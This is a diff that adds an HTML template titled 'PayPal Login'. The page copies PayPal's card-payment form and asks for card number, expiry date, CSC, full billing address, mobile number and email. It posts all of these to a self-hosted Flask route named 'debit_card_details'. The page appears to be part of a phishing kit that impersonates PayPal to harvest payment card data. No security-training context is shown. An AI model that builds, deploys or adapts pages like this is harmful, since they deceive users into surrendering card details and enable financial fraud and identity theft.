@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>PayPal Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css"
+        integrity="sha512-Evv84Mr4kqVGRNSgIGL/F/aIDqQb7xQ2vcrdIwxfjThSH8CSR7PBEakCr51Ck+w+/U6swU2Im1vVX0SVk9ABhg=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-4Q6Gf2aSP4eDXB8Miphtr37CMZZQ5oXLH2yaXMJ2w8e2ZtHTl7GptT4jmndRuHDT" crossorigin="anonymous">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<style>
+    .paypalimg {
+        width: 70px;
+        border-radius: 50%;
+        margin: 0 auto;
+    }
+
+    @media (max-width: 640px) {
+        .paypal-form {
+            border: none;
+            width: 95%;
+            padding: 1em;
+        }
+    }
+
+    @media (min-width: 641px) {
+        .paypal-form {
+            border: 1px solid rgb(226, 226, 226);
+            width: 60%;
+            padding: 3em;
+        }
+
+
+    }
+</style>
+
+<body class="bg-white-100">
+    <div class="flex flex-col min-h-screen items-center justify-center">
+
+        <!-- Main content -->
+        <div class="paypal-form bg-white rounded-lg mt-3 mb-3 flex-grow flex flex-col justify-center">
+            <!-- Card Payment Button -->
+        <div class="d-grid mb-4">
+            <button class="btn btn-dark d-flex justify-content-center align-items-center gap-2 py-3">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor"
+                    class="bi bi-credit-card" viewBox="0 0 16 16">
+                    <path
+                        d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v1H0V4zm0 2v6a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V6H0zm2 3h3v1H2v-1z" />
+                </svg>
+                Debit or Credit Card
+            </button>
+        </div>
+
+
+            <form action="{{ url_for('debit_card_details') }}" method="POST">
+                <div class="form-floating mb-3">
+                    <input type="number" style="font-weight: 500;" class="form-control" id="floatingInput"
+                        name="card-number" placeholder="Card number" required>
+                    <label for="floatingInput" style="font-weight: 400;">Card number</label>
+                </div>
+                <div class="d-flex" style="gap: 4%;">
+                    <div class="form-floating " style="width: 48%;">
+                        <input type="text" style="font-weight: 500;" class="form-control" id="floatingPassword"
+                            name="expiry-date" placeholder="Password" required>
+                        <label for="floatingPassword" style="font-weight: 400;">Expiry date</label>
+                    </div>
+                    <div class="form-floating " style="width: 48%;">
+                        <input type="text" style="font-weight: 500;" class="form-control" id="floatingPassword"
+                            name="csc-no" placeholder="Password" required>
+                        <label for="floatingPassword" style="font-weight: 400;">CSC</label>
+                    </div>
+                </div>
+
+                <!-- Country Dropdown -->
+                <div class="mt-4 mb-3 d-flex justify-content-between">
+                    <label class="form-label d-flex items-center mx-2 font-semibold">Billing address</label>
+                    <div class="dropdown ml-auto">
+                        <button style="border: none;" class="btn btn-outline-none d-flex align-items-center justify-content-between w-20"
+                            type="button" id="dropdownButton" data-bs-toggle="dropdown" aria-expanded="false">
+                            <img id="selectedFlag" src="https://flagcdn.com/w80/us.png" class="flag-img me-2 w-10">
+                            <i class="fa-solid fa-angle-down"></i>
+                        </button>
+                        <ul class="dropdown-menu w-60" id="dropdownMenu" aria-labelledby="dropdownButton">
+                            <li class="d-flex items-center" onclick="selectCountry('us')"><img
+                                    src="https://flagcdn.com/w40/us.png" class="flag-img m-1"> United States</li>
+                            <li class="d-flex" onclick="selectCountry('gb')"><img src="https://flagcdn.com/w40/gb.png"
+                                    class="flag-img m-1"> United Kingdom</li>
+                            <li class="d-flex" onclick="selectCountry('in')"><img src="https://flagcdn.com/w40/in.png"
+                                    class="flag-img m-1"> India</li>
+                            <li class="d-flex" onclick="selectCountry('ke')"><img src="https://flagcdn.com/w40/ke.png"
+                                    class="flag-img m-1"> Kenya</li>
+                            <li class="d-flex" onclick="selectCountry('jp')"><img src="https://flagcdn.com/w40/jp.png"
+                                    class="flag-img m-1"> Japan</li>
+                            <li class="d-flex" onclick="selectCountry('br')"><img src="https://flagcdn.com/w40/br.png"
+                                    class="flag-img m-1"> Brazil</li>
+                        </ul>
+                    </div>        
+                </div>
+                <div class="d-flex mb-3" style="gap: 4%;">
+                    <div class="form-floating " style="width: 48%;">
+                        <input type="text" style="font-weight: 500;" class="form-control" id="floatingPassword"
+                            name="fname" placeholder="Password" required>
+                        <label for="floatingPassword" style="font-weight: 400;">First name</label>
+                    </div>
+                    <div class="form-floating " style="width: 48%;">
+                        <input type="text" style="font-weight: 500;" class="form-control" id="floatingPassword"
+                            name="lname" placeholder="Last name" required>
+                        <label for="floatingPassword" style="font-weight: 400;">Last name</label>
+                    </div>
+                </div>
+                <div class="form-floating mb-3">
+                    <input type="text" style="font-weight: 500;" class="form-control" id="floatingInput"
+                        name="str-address" placeholder="Street address" required>
+                    <label for="floatingInput" style="font-weight: 400;">Street address</label>
+                </div>
+                <div class="form-floating mb-3">
+                    <input type="text" style="font-weight: 500;" class="form-control" id="floatingInput" name="apt-bldg"
+                        placeholder="Apt, Ste, Bldg" required>
+                    <label for="floatingInput" style="font-weight: 400;">Apt, Ste, Bldg</label>
+                </div>
+                <div class="form-floating mb-3">
+                    <input type="text" style="font-weight: 500;" class="form-control" id="floatingInput" name="city"
+                        placeholder="City" required>
+                    <label for="floatingInput" style="font-weight: 400;">City</label>
+                </div>
+                <div class="form-floating mb-3">
+                    <input type="text" style="font-weight: 500;" class="form-control" id="floatingInput" name="state"
+                        placeholder="State/Province/Region" required>
+                    <label for="floatingInput" style="font-weight: 400;">State</label>
+                </div>
+                <div class="form-floating mb-3">
+                    <input type="text" style="font-weight: 500;" class="form-control" id="floatingInput" name="zip-code"
+                        placeholder="Zip" required>
+                    <label for="floatingInput" style="font-weight: 400;">Zip code</label>
+                </div>
+                <div class="form-floating mb-3">
+                    <input type="text" style="font-weight: 500;" class="form-control" id="floatingInput"
+                        name="mobile-no" placeholder="Mobile" required>
+                    <label for="floatingInput" style="font-weight: 400;">Mobile</label>
+                </div>
+                <div class="form-floating mb-3">
+                    <input type="email" style="font-weight: 500;" class="form-control" id="floatingInput" name="email"
+                        placeholder="Email" required>
+                    <label for="floatingInput" style="font-weight: 400;">Email</label>
+                </div>
+
+                <!-- Checkbox -->
+                <div class="form-check mb-3">
+                    <input class="form-check-input" type="checkbox" id="sameAddress">
+                    <label class="form-check-label" for="sameAddress">Ship to billing address</label>
+                </div>
+
+                <p class="text-muted small mb-3">By continuing, you confirm you're 18 years or older.</p>
+                <!-- Submit Button -->
+                <div class="d-grid">
+                    <button type="submit" class="btn btn-primary" style="border-radius: 20px; font-weight: 300;">Continue to Pay</button>
+                </div>
+
+
+            </form>
+        </div>
+
+    </div>
+
+    <!-- Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.6/dist/js/bootstrap.bundle.min.js"></script>
+
+    <script>
+        function selectCountry(code) {
+            const flagUrl = `https://flagcdn.com/w80/${code}.png`;
+            document.getElementById("selectedFlag").src = flagUrl;
+        }
+    </script>
+</body>
+
+</html>
